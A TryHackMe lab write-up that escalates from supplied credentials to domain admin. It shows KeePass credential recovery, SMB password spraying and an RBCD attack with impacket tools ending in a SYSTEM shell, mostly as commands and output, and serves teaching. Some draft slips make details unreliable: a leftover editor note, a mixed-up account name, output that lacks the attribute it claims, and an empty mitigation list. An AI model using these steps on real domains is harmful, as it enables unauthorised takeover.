# Forward

Forward is a challenge room in TryHackMe's "Jr Penetration Tester" pathway.
The starting point is an assumed breach in an Active Directory environment.
To simulate this, we're given credentials for establishing a foothold.
Our task is to escalate our privileges as far as possible.

After gaining foothold via RDP, we find a KeePass database belonging to `j.smith`.
In it we find credentials for `t.jones`.
Using these credentials, we enumerate users via SMB.
A password spraying attack against SMB reveals password reuse by `r.williams`.
After logging in as `r.williams` via RDP we discover that this account has the `msDS-AllowedToActOnBehalfOfOtherIdentity` property.
We exploit this to perform a Resource-Based Constrained Delegation (RBCD) attack escalate our privileges to `Administrator` and take over the Domain Controller.

**Note:** All personally identifying information, like the IP-s of attacking machines of VM-s, are replaced with placeholders for privacy and all flags or passwords are redacted to not spoil the challenge.

## Reconnaissance

We're given the following credentials:

- **Username**: `ctf.local\j.smith`
- **Password**: `JSmith@IT2024`

### Nmap

We nonetheless start with `nmap` to map the attack surface.

```
$ IP=<TARGET-IP>
$ ports=$(nmap -p- --min-rate=1000 ${IP} | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed 's/,$//')
$ sudo nmap -sS -sC -sV -O -p$ports $IP -oA forward
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-21 23:03 +0300
Nmap scan report for <TARGET-IP>
Host is up (0.59s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-21 20:03:19Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: ctf.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: ctf.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC01.ctf.local
| Not valid before: 2026-05-19T02:27:27
|_Not valid after:  2026-11-18T02:27:27
| rdp-ntlm-info:
|   Target_Name: CTF
|   NetBIOS_Domain_Name: CTF
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: ctf.local
|   DNS_Computer_Name: DC01.ctf.local
|   Product_Version: 10.0.17763
|_  System_Time: 2026-07-21T20:04:25+00:00
|_ssl-date: 2026-07-21T20:05:04+00:00; -1s from scanner time.
9389/tcp  open  mc-nmf        .NET Message Framing
49668/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49699/tcp open  msrpc         Microsoft Windows RPC
49807/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Microsoft Windows Server 2019 (97%), Microsoft Windows 10 1903 - 22H2 (91%)
No exact OS matches for host (test conditions non-ideal).
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2026-07-21T20:04:27
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
|_clock-skew: mean: -1s, deviation: 0s, median: -2s

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 141.07 seconds
```

The open ports and services suggest that the target is a domain [controller](https://lazyadmin.nl/it/domain-controller-ports/):

- DNS on port 53
- Kerberos on port 88
- RPC on port 135
- NetBIOS on port 139
- LDAP on port 389
- SMB on port 445
- Kerberos password change on port 464
- LDAP SSL on port 636
- LDAP Global Catalog / LDAP GC SSL on ports 3268 and 3269
- Active Directory Web Services (ADWS) on port 9389

We add the domain and hostnames to `/etc/hosts` so that our tools can resolve them to `<TARGET-IP>`:

```
$ echo $(echo ${IP}) DC01.ctf.local ctf.local | sudo tee -a /etc/hosts
<TARGET-IP> DC01.ctf.local ctf.local
```

The intended path is to gain a foothold via RDP with the provided credentials.
We nonetheless check for other things as well just to rule them out.

### SMB

Our credentials provide access to the following shares:

```
$ nxc smb $IP -u 'j.smith' -p 'JSmith@IT2024' --shares
SMB         <TARGET-IP>  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:ctf.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         <TARGET-IP>  445    DC01             [+] ctf.local\j.smith:JSmith@IT2024
SMB         <TARGET-IP>  445    DC01             [*] Enumerated shares
SMB         <TARGET-IP>  445    DC01             Share           Permissions     Remark
SMB         <TARGET-IP>  445    DC01             -----           -----------     ------
SMB         <TARGET-IP>  445    DC01             ADMIN$                          Remote Admin
SMB         <TARGET-IP>  445    DC01             C$                              Default share
SMB         <TARGET-IP>  445    DC01             Downloads       READ            File drop share
SMB         <TARGET-IP>  445    DC01             IPC$            READ            Remote IPC
SMB         <TARGET-IP>  445    DC01             NETLOGON        READ            Logon server share
SMB         <TARGET-IP>  445    DC01             SYSVOL          READ            Logon server share
```

The `Downloads`, `NETLOGON` and `SYSVOL` shares are empty:

```
$ smbmap -H $IP -u 'j.smith' -p 'JSmith@IT2024' -r --no-pass --no-banner
[*] Detected 1 hosts serving SMB
[*] Established 1 SMB connections(s) and 1 authenticated session(s)

[+] IP: <TARGET-IP>:445	Name: <hostname>	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	Downloads                                         	READ ONLY	File drop share
	./Downloads
	dr--r--r--                0 Wed May 20 10:32:26 2026	.
	dr--r--r--                0 Wed May 20 10:32:26 2026	..
	IPC$                                              	READ ONLY	Remote IPC
	./IPC$
	fr--r--r--                3 Mon Jan  1 00:00:00 1601	InitShutdown
	fr--r--r--                4 Mon Jan  1 00:00:00 1601	lsass
	fr--r--r--                3 Mon Jan  1 00:00:00 1601	ntsvcs
	fr--r--r--                3 Mon Jan  1 00:00:00 1601	scerpc
	fr--r--r--                1 Mon Jan  1 00:00:00 1601	Winsock2\CatalogChangeListener-378-0
	fr--r--r--                3 Mon Jan  1 00:00:00 1601	epmapper
	fr--r--r--                1 Mon Jan  1 00:00:00 1601	Winsock2\CatalogChangeListener-208-0
	fr--r--r--                3 Mon Jan  1 00:00:00 1601	LSM_API_service
	fr--r--r--                3 Mon Jan  1 00:00:00 1601	eventlog
	fr--r--r--                1 Mon Jan  1 00:00:00 1601	Winsock2\CatalogChangeListener-4e4-0
	fr--r--r--                4 Mon Jan  1 00:00:00 1601	wkssvc
	fr--r--r--                3 Mon Jan  1 00:00:00 1601	atsvc
	fr--r--r--                1 Mon Jan  1 00:00:00 1601	Winsock2\CatalogChangeListener-688-0
	fr--r--r--                3 Mon Jan  1 00:00:00 1601	TermSrv_API_service
	fr--r--r--                3 Mon Jan  1 00:00:00 1601	Ctx_WinStation_API_service
	fr--r--r--                3 Mon Jan  1 00:00:00 1601	SessEnvPublicRpc
	fr--r--r--                1 Mon Jan  1 00:00:00 1601	Winsock2\CatalogChangeListener-8b4-0
	fr--r--r--                1 Mon Jan  1 00:00:00 1601	Winsock2\CatalogChangeListener-278-0
	fr--r--r--                1 Mon Jan  1 00:00:00 1601	Winsock2\CatalogChangeListener-278-1
	fr--r--r--                3 Mon Jan  1 00:00:00 1601	RpcProxy\49674
	fr--r--r--                3 Mon Jan  1 00:00:00 1601	e794ed4109aa7a29
	fr--r--r--                3 Mon Jan  1 00:00:00 1601	RpcProxy\593
	fr--r--r--                4 Mon Jan  1 00:00:00 1601	srvsvc
	fr--r--r--                3 Mon Jan  1 00:00:00 1601	spoolss
	fr--r--r--                1 Mon Jan  1 00:00:00 1601	Winsock2\CatalogChangeListener-bb8-0
	fr--r--r--                3 Mon Jan  1 00:00:00 1601	netdfs
	fr--r--r--                1 Mon Jan  1 00:00:00 1601	Winsock2\CatalogChangeListener-260-0
	fr--r--r--                3 Mon Jan  1 00:00:00 1601	W32TIME_ALT
	fr--r--r--                1 Mon Jan  1 00:00:00 1601	PSHost.134339016154708177.4012.DefaultAppDomain.powershell
	fr--r--r--                1 Mon Jan  1 00:00:00 1601	Winsock2\CatalogChangeListener-c1c-0
	fr--r--r--                1 Mon Jan  1 00:00:00 1601	PIPE_EVENTROOT\CIMV2SCM EVENT PROVIDER
	fr--r--r--                1 Mon Jan  1 00:00:00 1601	Winsock2\CatalogChangeListener-c08-0
	NETLOGON                                          	READ ONLY	Logon server share
	./NETLOGON
	dr--r--r--                0 Wed May 20 02:22:18 2026	.
	dr--r--r--                0 Wed May 20 02:22:18 2026	..
	SYSVOL                                            	READ ONLY	Logon server share
	./SYSVOL
	dr--r--r--                0 Wed May 20 02:22:18 2026	.
	dr--r--r--                0 Wed May 20 02:22:18 2026	..
	dr--r--r--                0 Wed May 20 02:22:18 2026	ctf.local
[*] Closed 1 connections
```

### AS-REP roasting, Kerberoasting and DCSync

AS-REP roasting is a credential harvesting technique that exploits accounts that have Kerberos pre-authentication disabled.
For such accounts, we could send an AS-REQ (Authentication Server Request) without providing any credentials and receive an AS-REP (Authentication Server Response).
This contains the session key and other material encrypted with the user's password using RC4-HMAC encryption.
Cracking this response reveals the user's password.
Sadly, there seem to be no accounts with Kerberos pre-authentication disabled:

```
$ impacket-GetNPUsers -dc-ip $IP ctf.local/j.smith:'JSmith@IT2024' -request -format john
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

No entries found!
```

Kerberoasting involves requesting a TGT (Ticket Granting Ticket) and a TGS (Ticket Granting Service) from an account with a registered SPN (Service Principal Name) for offline cracking to obtain the service account's password.
We find one kerberoastable ticket:

```
$ impacket-GetUserSPNs -dc-ip $IP ctf.local/j.smith:'JSmith@IT2024' -request
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

ServicePrincipalName     Name          MemberOf  PasswordLastSet             LastLogon                   Delegation
-----------------------  ------------  --------  --------------------------  --------------------------  -----------
helpdesk/DC01            svc.helpdesk            2026-05-20 21:35:56.137405  2026-05-20 21:35:14.951529  constrained
helpdesk/DC01.ctf.local  svc.helpdesk            2026-05-20 21:35:56.137405  2026-05-20 21:35:14.951529  constrained



[-] CCache file is not found. Skipping...
$krb5tgs$23$*svc.helpdesk$CTF.LOCAL$ctf.local/svc.helpdesk*$5d8fa6fae37cb7362bac8cd950e7afee$e5af0e6fbe6d7ed025f8025ee[...]
```

However, it can't be cracked with `john` and the `rockyou.txt` wordlist.
While some other wordlist, or one generated with `john`, might work, failure to crack a hash within a reasonably short time in a CTF usually indicates a rabbit hole.

A DCSync attack would let us request password hashes by impersonating a domain controller and performing a domain replication (DC Sync).
This would reveal password hashes that we could use for creating a golden ticket, a pass-the-ticket attack or for taking over an account by changing its password.
This requires access to users with `DS-Replication-Get-Changes`, `DS-Replication-Get-Changes-All` or `DS-Replication-Get-Changes-In-Filtered-Set` privileges.
Members of Domain Admins, Enterprise Admins, Administrators or Domain Controllers groups have these permissions by default.
Unfortunately, `j.smith` does not have these privileges:

```
$ impacket-secretsdump 'ctf.local/j.smith:JSmith@IT2024@<TARGET-IP>'
Impacket v0.14.0 - Copyright Fortra, LLC and its affiliated companies

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
[-] DRSR SessionError: code: 0x20f7 - ERROR_DS_DRA_BAD_DN - The distinguished name specified for this replication operation is invalid.
[*] Something went wrong with the DRSUAPI approach. Try again with -use-vss parameter
[*] Cleaning up...
```

## Lateral movement: j.smith > r.williams

We get a foothold via RDP with the provided credentials:

```
$ xfreerdp /u:'ctf.local\j.smith' /p:'JSmith@IT2024' /v:$IP /cert:ignore /clipboard /dynamic-resolution
```

### Reconnaissance

We launch PowerShell for enumeration.
First we check our current privileges:

```
PS C:\Users\j.smith> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeMachineAccountPrivilege     Add workstations to domain     Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

`j.smith` is in the `Remote Desktop Users` and `Domain Users` groups:

```
PS C:\Users\j.smith> net user j.smith
User name                    j.smith
Full Name
Comment                      IT Staff
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            5/20/2026 3:29:49 AM
Password expires             Never
Password changeable          5/21/2026 3:29:49 AM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   9/15/2026 12:25:04 AM

Logon hours allowed          All

Local Group Memberships      *AppLocker-Restricted *Remote Desktop Users
Global Group memberships     *Domain Users
The command completed successfully.
```

`r.williams` is another potentially interesting user:

```
PS C:\Users\j.smith> net user

User accounts for \\DC01

-------------------------------------------------------------------------------
Administrator            j.smith                  krbtgt
r.williams
The command completed successfully.
```

Next, we check OS, version and other system information:

```
PS C:\Users\j.smith> systeminfo

Host Name:                 DC01
OS Name:                   Microsoft Windows Server 2019 Datacenter
OS Version:                10.0.17763 N/A Build 17763
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Primary Domain Controller
OS Build Type:             Multiprocessor Free
Registered Owner:          EC2
Registered Organization:   Amazon.com
Product ID:                00430-00000-00000-AA070
Original Install Date:     3/17/2021, 2:59:06 PM
System Boot Time:          9/14/2026, 11:19:05 PM
System Manufacturer:       Amazon EC2
System Model:              t3a.medium
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2200 Mhz
BIOS Version:              Amazon EC2 1.0, 10/16/2017
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC) Coordinated Universal Time
Total Physical Memory:     4,048 MB
Available Physical Memory: 2,606 MB
Virtual Memory: Max Size:  4,752 MB
Virtual Memory: Available: 3,290 MB
Virtual Memory: In Use:    1,462 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    ctf.local
Logon Server:              \\DC01
Hotfix(s):                 27 Hotfix(s) Installed.
                           [01]: KB4601555
                           [02]: KB4470502
                           [03]: KB4470788
                           [04]: KB4480056
                           [05]: KB4486153
                           [06]: KB4493510
                           [07]: KB4499728
                           [08]: KB4504369
                           [09]: KB4512577
                           [10]: KB4512937
                           [11]: KB4521862
                           [12]: KB4523204
                           [13]: KB4535680
                           [14]: KB4539571
                           [15]: KB4549947
                           [16]: KB4558997
                           [17]: KB4562562
                           [18]: KB4566424
                           [19]: KB4570332
                           [20]: KB4577586
                           [21]: KB4577667
                           [22]: KB4587735
                           [23]: KB4589208
                           [24]: KB4598480
                           [25]: KB4601393
                           [26]: KB5000859
                           [27]: KB5001568
Network Card(s):           1 NIC(s) Installed.
                           [01]: Amazon Elastic Network Adapter
                                 Connection Name: Ethernet 3
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.114.128.1
                                 IP address(es)
                                 [01]: <TARGET-IP>
                                 [02]: fe80::459e:cfb7:83af:bcfb
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```

Checking for all the files in the `j.smith` user's directory reveals a KeePass database:

```
PS C:\Users\j.smith> Get-ChildItem -Path C:\Users/j.smith -Recurse -ErrorAction SilentlyContinue


    Directory: C:\Users\j.smith


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        5/20/2026  10:28 AM                3D Objects
d-r---        5/20/2026  10:28 AM                Contacts
d-r---        5/20/2026   3:21 PM                Desktop
d-r---        5/20/2026   6:35 PM                Documents
d-r---        5/20/2026  10:28 AM                Downloads
d-r---        5/20/2026  10:28 AM                Favorites
d-r---        5/20/2026  10:28 AM                Links
d-r---        5/20/2026  10:28 AM                Music
d-r---        5/20/2026  10:28 AM                Pictures
d-r---        5/20/2026  10:28 AM                Saved Games
d-r---        5/20/2026  10:28 AM                Searches
d-r---        5/20/2026  10:28 AM                Videos


    Directory: C:\Users\j.smith\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        5/20/2026  10:43 AM           2071 Database.kdbx


    Directory: C:\Users\j.smith\Favorites


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        5/20/2026  10:28 AM                Links
-a----        5/20/2026  10:28 AM            208 Bing.url


    Directory: C:\Users\j.smith\Links


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        5/20/2026  10:28 AM            500 Desktop.lnk
-a----        5/20/2026  10:28 AM            945 Downloads.lnk
```

`r.williams` has a `.txt` file on their desktop:

```
PS C:\Users\j.smith> Get-ChildItem -Path C:\Users/r.williams -Recurse -ErrorAction SilentlyContinue


    Directory: C:\Users\r.williams


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        5/20/2026  10:52 AM                Desktop


    Directory: C:\Users\r.williams\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        5/20/2026   3:29 PM            329 Automation-Notice.txt
```

Since we can't read it, let's focus on the KeePass database.
Checking the Start Menu we find that KeePass 2 is installed.
Launching the app opens a password dialogue box with the `C:\Users\j.smith\Documents\Database.kdbx` file already selected.
Although we don't know the password, the "Windows user account" box is also already selected.
This option allows us to open the database after we've logged in as the user who created [it](https://keepass.info/help/base/keys.html).
This option shows that the database was locked user's dpapi meaning that vault is bound to being logged in as the user whose vault it is & is opened when that user logs in (the pw is created with `j.smith`'s win account) [perhaps remove or elaborate]

While there are several entires in the database, `t.jones` is the only one that follows the username conventions we've encountered so far.
Regardless, note down all the credentials we find:
- `Michael321:12345`
- `t.jones:<REDACTED-PW>`

Using our new credentials, let's enumerate domain users and export the results to a file called `usernames.txt`:

```
$ nxc smb $IP -u t.jones -p '<REDACTED-PW>' --users-export usernames.txt
SMB         <TARGET-IP>  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:ctf.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         <TARGET-IP>  445    DC01             [+] ctf.local\t.jones:<REDACTED-PW>
SMB         <TARGET-IP>  445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-
SMB         <TARGET-IP>  445    DC01             Administrator                 2026-05-20 03:03:45 0       Built-in account for administering the computer/domain
SMB         <TARGET-IP>  445    DC01             Guest                         2026-05-20 02:24:15 0       Built-in account for guest access to the computer/domain
SMB         <TARGET-IP>  445    DC01             krbtgt                        2026-05-20 03:04:18 0       Key Distribution Center Service Account
SMB         <TARGET-IP>  445    DC01             j.smith                       2026-05-20 03:29:49 0       IT Staff
SMB         <TARGET-IP>  445    DC01             t.jones                       2026-05-20 03:29:49 0       Help Desk
SMB         <TARGET-IP>  445    DC01             r.williams                    2026-05-20 03:29:49 0       Help Desk Senior
SMB         <TARGET-IP>  445    DC01             svc.helpdesk                  2026-05-20 18:35:56 26      HelpDesk Service Acct
SMB         <TARGET-IP>  445    DC01             [*] Enumerated 7 local users: CTF
SMB         <TARGET-IP>  445    DC01             [*] Writing 7 local users to usernames.txt
```

A password spraying attack involves testing one password against several accounts to identify password reuse.
First, let's check the password policy to avoid accidentally locking ourselves out:

```
$ nxc smb $IP -u 't.jones' -p '<REDACTED-PW>' --pass-pol
SMB         <TARGET-IP>   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:ctf.local) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         <TARGET-IP>   445    DC01             [+] ctf.local\t.jones:<REDACTED-PW>
SMB         <TARGET-IP>   445    DC01             [+] Dumping password info for domain: CTF
SMB         <TARGET-IP>   445    DC01             Minimum password length: 7
SMB         <TARGET-IP>   445    DC01             Password history length: 24
SMB         <TARGET-IP>   445    DC01             Maximum password age: 41 days 23 hours 53 minutes
SMB         <TARGET-IP>   445    DC01
SMB         <TARGET-IP>   445    DC01             Password Complexity Flags: 000001
SMB         <TARGET-IP>   445    DC01                 Domain Refuse Password Change: 0
SMB         <TARGET-IP>   445    DC01                 Domain Password Store Cleartext: 0
SMB         <TARGET-IP>   445    DC01                 Domain Password Lockout Admins: 0
SMB         <TARGET-IP>   445    DC01                 Domain Password No Clear Change: 0
SMB         <TARGET-IP>   445    DC01                 Domain Password No Anon Change: 0
SMB         <TARGET-IP>   445    DC01                 Domain Password Complex: 1
SMB         <TARGET-IP>   445    DC01
SMB         <TARGET-IP>   445    DC01             Minimum password age: 1 day 4 minutes
SMB         <TARGET-IP>   445    DC01             Reset Account Lockout Counter: 30 minutes
SMB         <TARGET-IP>   445    DC01             Locked Account Duration: 30 minutes
SMB         <TARGET-IP>   445    DC01             Account Lockout Threshold: None
SMB         <TARGET-IP>   445    DC01             Forced Log off Time: Not Set
```

There's no lockout threshold.
We can proceed with the password spraying attack against our enumerated accounts:

```
$ nxc smb $IP -u usernames.txt -p '<REDACTED-PW>' --continue-on-success
SMB         <TARGET-IP>  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:ctf.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         <TARGET-IP>  445    DC01             [-] ctf.local\Administrator:<REDACTED-PW> STATUS_LOGON_FAILURE
SMB         <TARGET-IP>  445    DC01             [-] ctf.local\Guest:<REDACTED-PW> STATUS_LOGON_FAILURE
SMB         <TARGET-IP>  445    DC01             [-] ctf.local\krbtgt:<REDACTED-PW> STATUS_LOGON_FAILURE
SMB         <TARGET-IP>  445    DC01             [-] ctf.local\j.smith:<REDACTED-PW> STATUS_LOGON_FAILURE
SMB         <TARGET-IP>  445    DC01             [+] ctf.local\t.jones:<REDACTED-PW>
SMB         <TARGET-IP>  445    DC01             [+] ctf.local\r.williams:<REDACTED-PW>
SMB         <TARGET-IP>  445    DC01             [-] ctf.local\svc.helpdesk:<REDACTED-PW> STATUS_LOGON_FAILURE
```

Looks like `j.smith` and `r.williams` share a password: `r.williams:<REDACTED-PW>`
We confirm this with `nxc`:

```
$ nxc rdp $IP -u 'r.williams' -p '<REDACTED-PW>'
RDP         <TARGET-IP>   3389   DC01             [*] Windows 10 or Windows Server 2016 Build 17763 (name:DC01) (domain:ctf.local) (nla:False)
RDP         <TARGET-IP>   3389   DC01             [+] ctf.local\r.williams:<REDACTED-PW> (Pwn3d!)
```

### Lateral movement

Login via RDP with reused credentials:

```
$ xfreerdp /u:r.williams /p:'<REDACTED-PW>' /v:$IP /cert:ignore /clipboard /dynamic-resolution
```

## Privilege escalation: r.williams > administrator

### Reconnaissance

Open PowerShell to check our current privileges:


```
PS C:\Users\r.williams.CTF> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeMachineAccountPrivilege     Add workstations to domain     Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

`r.williams` has the same privileges as `j.smith`.
However, checking their user properties with `Get-ADUser -Identity "r.williams" -Properties *` we find that they have the `msDS-AllowedToActOnBehalfOfOtherIdentity` property (we highlight it here for clarity):

```
PS C:\Users\r.williams.CTF> Get-ADUser -Identity "r.williams" -Properties msDS-AllowedToActOnBehalfOfOtherIdentity


DistinguishedName : CN=r.williams,CN=Users,DC=ctf,DC=local
Enabled           : True
GivenName         :
Name              : r.williams
ObjectClass       : user
ObjectGUID        : 2a58583c-d30e-4e10-9d91-07342a70191f
SamAccountName    : r.williams
SID               : S-1-5-21-1966530601-3185510712-10604624-1611
Surname           :
UserPrincipalName : r.williams@ctf.local
```

We can get further details on this property with `nxc`:

```
$ nxc ldap DC01.ctf.local -u 'r.williams' -p '<REDACTED-PW>' --find-delegation
LDAP        <TARGET-IP>   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:ctf.local) (signing:None) (channel binding:No TLS cert)
LDAP        <TARGET-IP>   389    DC01             [+] ctf.local\r.williams:<REDACTED-PW>
LDAP        <TARGET-IP>   389    DC01             AccountName  AccountType DelegationType                     DelegationRightsTo
LDAP        <TARGET-IP>   389    DC01             ------------ ----------- ---------------------------------- ------------------
LDAP        <TARGET-IP>   389    DC01             svc.helpdesk Person      Constrained w/ Protocol Transition
```

This opens the way to a Resource-Based Constrained Delegation (RBCD) attack for possible privilege escalation.

In Active Directory, delegation allows one service to access another on behalf of a user or machine account.
For example, delegation allows a web application, to which a user has authenticated, access a back-end database on that user's behalf.
Active Directory has three kinds of Kerberos delegation:

- **Unconstrained Delegation** lets any service impersonate any user to any other service in the domain.
- **Constrained Delegation** is configured on the delegating account with the `msDS-AllowedToDelegateTo` property and restricts which services a given service can delegate to.
- **Resource-Based Constrained Delegation** is configured via the `msDS-AllowedToActOnBehalfOfOtherIdentity` property on the target and specifies who can delegate to [it](https://www.redfoxsec.com/blog/resource-based-constrained-delegation-rbcd-attack-how-attackers-exploit-active-directory-trust.)

In other words, constrained delegation tells a computer which users or clients it can impersonate against which services.
Resource-based constrained delegation lets the service determine which users or clients may impersonate against it.

An RBCD attack requires three things:

1. Write permissions on the target (e.g. `GenericWrite`, `GenericAll`, `WriteProperty`, `WriteDacl`).
2. A machine account we control or the ability to create machine accounts (`MachineAccountQuota = 10` by default for domain users, meaning that they can create up to 10 machine accounts).
3. Network access for requesting Kerberos tickets.

The attack itself proceeds as [follows](https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/resource-based-constrained-delegation.html):

1. The attacker compromises a machine account, `service-1`, with an SPN or creates one.
2. The attacker exploits write permissions over the target, `service-2`, to configure resource-based constrained delegation so that `service-1` can impersonate any user against `service-2`.
3. The attacker performs a full Service for User (S4U) attack, comprised of Service for User to Self (S4U2Self) and Service for User to Proxy (S4U2Proxy) attacks from `service-1` to `service-2` for a user that has privileged access to `service-2`:
        - S4U2Self: from `service-1` to request a TGS representing the `Administrator` to `service-1` (this ticket is not forwardable).
        - S4U2Proxy: use the non-forwardable TGS to request a service ticket representing `Administrator` to `service-2`
4. The attacker performs a pass-the-ticket attack and impersonates the `Administrator` to gain access to `service-2`.

### Privilege Escalation

Since the requirements are met, let's perform the attack.
First, create a computer account with an SPN that we control:

```
$ impacket-addcomputer -computer-name 'PWNED$' -computer-pass 'pwned!' -dc-host dc01.ctf.local -domain-netbios ctf.local 'ctf.local/r.williams:<REDACTED-PW>'
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Successfully added machine account PWNED$ with password pwned!.
```

Second, write RBCD on the domain controller (`DC01`) so that our newly-created machine account can act on the domain controller's behalf:

```
$ impacket-rbcd -delegate-from 'PWNED$' -delegate-to 'DC01$' -action 'write' 'ctf.local/r.williams:<REDACTED-PW>'
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] PWNED$ can now impersonate users on DC01$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     PWNED$       (S-1-5-21-1966530601-3185510712-10604624-3109)
```

Third, we perform the S4U attack:

```
$ impacket-getST -impersonate 'Administrator' -spn 'cifs/DC01.ctf.local' 'ctf.local/PWNED$:pwned!'
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache
```

Finally, save the ticket to an environment variable and use it to get a `SYSTEM` shell via `psexec`:

```
$ export KRB5CCNAME=Administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache

$ impacket-psexec -k -no-pass ctf.local/Administrator@DC01.ctf.local
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Requesting shares on DC01.ctf.local.....
[*] Found writable share ADMIN$
[*] Uploading file AFzOIZBD.exe
[*] Opening SVCManager on DC01.ctf.local.....
[*] Creating service wZiz on DC01.ctf.local.....
[*] Starting service wZiz.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

All that's left is to find and get the flag:

```
C:\Windows\system32> dir C:\Users\Administrator\Desktop
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\Users\Administrator\Desktop

05/20/2026  03:21 PM    <DIR>          .
05/20/2026  03:21 PM    <DIR>          ..
05/20/2026  05:52 PM                37 flag.txt
               1 File(s)             37 bytes
               2 Dir(s)  14,646,505,472 bytes free

C:\Windows\system32> type C:\Users\Administrator\Desktop\flag.txt
<REDACTED-FLAG>
```

## Summary

RBCD is dangerous because it exploits trust relationships between objects in an Active Directory environment.
Instead of software vulnerabilities, it depends on a combination of misconfigurations, convenient defaults, human error and intended design features.

In addition, RBCD can be difficult to detect.
By default, modifications to `msDS-AllowedToActOnBehalfOfOtherIdentity` do not generate alerts.
RBCD attacks can remain undetected unless auditing and logging policies are setup to detect them.
In a [blog post](https://www.redfoxsec.com/blog/resource-based-constrained-delegation-rbcd-attack-how-attackers-exploit-active-directory-trust), Redfox Cybersecurity show how to detect such attacks.
Some of the mitigation suggestions below are also taken from that post.

Finally, here are some ways to mitigate the vulnerabilities exploited in this room:

